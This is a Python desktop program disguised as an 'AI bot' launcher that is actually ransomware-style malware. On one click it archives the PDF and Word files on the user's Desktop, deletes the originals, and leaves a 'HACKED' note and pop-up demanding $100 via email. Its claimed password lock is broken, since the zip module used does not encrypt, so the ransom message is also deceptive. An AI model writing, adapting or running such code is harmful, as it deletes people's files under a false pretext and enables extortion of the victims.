import os
import zipfile
import tkinter as tk
from tkinter import ttk, messagebox

# كلمة السر للقفل
PASSWORD = "Itchnisunshinewego1"

class FileLockerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("AI bot")
        self.root.geometry("400x200")
        
        self.setup_ui()
    
    def setup_ui(self):
        # إطار رئيسي
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(expand=True, fill=tk.BOTH)
        
        # تسمية العنوان
        title_label = ttk.Label(
            main_frame, 
            text="LAUNCH the bot",
            font=('Helvetica', 12, 'bold')
        )
        title_label.pack(pady=10)
        
        # زر القفل
        lock_button = ttk.Button(
            main_frame,
            text="START THE BOT",
            command=self.lock_files,
            style='Accent.TButton'
        )
        lock_button.pack(pady=20, ipadx=10, ipady=5)
        
        # شريط التقدم
        self.progress = ttk.Progressbar(
            main_frame,
            orient=tk.HORIZONTAL,
            length=300,
            mode='determinate'
        )
        self.progress.pack(pady=10)
        
        # تسمية الحالة
        self.status_label = ttk.Label(
            main_frame,
            text="READY TO START",
            font=('Helvetica', 9)
        )
        self.status_label.pack()
        
        # تحسين المظهر
        self.root.style = ttk.Style()
        self.root.style.configure('Accent.TButton', font=('Helvetica', 10, 'bold'), foreground='white', background='#dc3545')
    
    def lock_files(self):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        files_to_lock = [f for f in os.listdir(desktop_path) 
                        if f.lower().endswith((".pdf", ".doc", ".docx")) 
                        and not f.endswith(".locked")]
        
        if not files_to_lock:
            messagebox.showinfo("LUCKY BITCH")
            return
        
        total_files = len(files_to_lock)
        locked_count = 0
        
        self.progress['maximum'] = total_files
        self.progress['value'] = 0
        
        for i, file in enumerate(files_to_lock, 1):
            file_path = os.path.join(desktop_path, file)
            try:
                # إنشاء أرشيف مضغوط بكلمة سر
                zip_path = file_path + ".locked"
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    zipf.setpassword(PASSWORD.encode('utf-8'))
                    zipf.write(file_path, os.path.basename(file_path))
                
                # حذف الملف الأصلي بعد التأكد من إنشاء الأرشيف
                if os.path.exists(zip_path):
                    os.remove(file_path)
                    locked_count += 1
                
                # تحديث الواجهة
                self.progress['value'] = i
                self.status_label.config(text=f"STARTING.... {i}/{total_files}")
                self.root.update_idletasks()
                
            except Exception as e:
                messagebox.showerror("????", f"LUCKY BITCH {file}: {str(e)}")
        
        # إنشاء ملف READMEPLS.txt بعد الانتهاء من قفل الملفات
        self.create_readme_file(desktop_path)
        
        messagebox.showinfo(
            "U GOT HACKED ", 
            f"تم قفل {locked_count} من أصل {total_files} ملف بنجاح!\n\n"
            "TO UNLOCK YOUR FILES PLEASE CONTACT ME AT : louaimss9@gmail.com IT COSTS U ONLY 100$"
        )
        self.status_label.config(text=f"DONE {locked_count} ")
        self.progress['value'] = 0
    
    def create_readme_file(self, desktop_path):
        """إنشاء ملف READMEPLS.txt على سطح المكتب"""
        readme_path = os.path.join(desktop_path, "HACKED.txt")
        try:
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write("you got hacked , all ur files are safe but u need to pay for unlock them ,contact me at louaimss9@gmail.com")
            print(f"تم إنشاء ملف READMEPLS.txt بنجاح")
        except Exception as e:
            print(f"DONE {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = FileLockerApp(root)
    root.mainloop()